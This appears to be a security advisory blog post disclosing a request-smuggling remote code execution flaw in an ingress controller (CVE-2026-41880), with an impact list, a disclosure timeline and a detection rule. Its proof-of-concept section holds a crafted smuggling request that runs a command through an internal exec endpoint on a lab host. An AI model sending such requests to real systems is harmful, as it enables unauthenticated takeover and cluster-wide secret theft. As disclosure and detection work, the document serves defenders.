---
layout: ../../layouts/ArticleLayout.astro
title: "Unauthenticated RCE in an edge ingress controller"
description: "A header-parsing desync lets a crafted request reach the admin socket. Full chain, patch diff and IOCs."
pubDate: 2026-09-07
category: "Exploits"
cve: "CVE-2026-41880"
cvss: 9.8
tags: ["http", "kubernetes", "smuggling"]
---

The ingress controller parses the `Transfer-Encoding` header twice: once in the edge proxy and once in the upstream
handler. A request that is chunked to one parser and content-length-framed to the other desyncs the stream, and
**the second request body is interpreted as a fresh request** on an already-authenticated socket.

## Impact

- Unauthenticated request smuggling to the internal admin API
- Arbitrary command execution as `root` inside the controller pod
- Cluster-wide secret disclosure via the controller's service account

> Affected: 3.4.0 – 3.7.2. Patched in 3.7.3. There is no configuration-only mitigation.

## Proof of concept

```http
POST /_internal/exec HTTP/1.1
Host: gateway.lab.internal
Transfer-Encoding: chunked
Content-Length: 61

0

POST /_internal/exec HTTP/1.1
X-Cmd: id
```

## Detection

Alert on any upstream request carrying both framing headers, then correlate against controller access logs.

```yaml
detection:
  selection:
    http.request.headers|contains|all:
      - 'transfer-encoding'
      - 'content-length'
  condition: selection
level: critical
```

## Timeline

Disclosed to the vendor on 2026-08-19, fix shipped 2026-09-05, published after the 90-day window closed early by
mutual agreement.
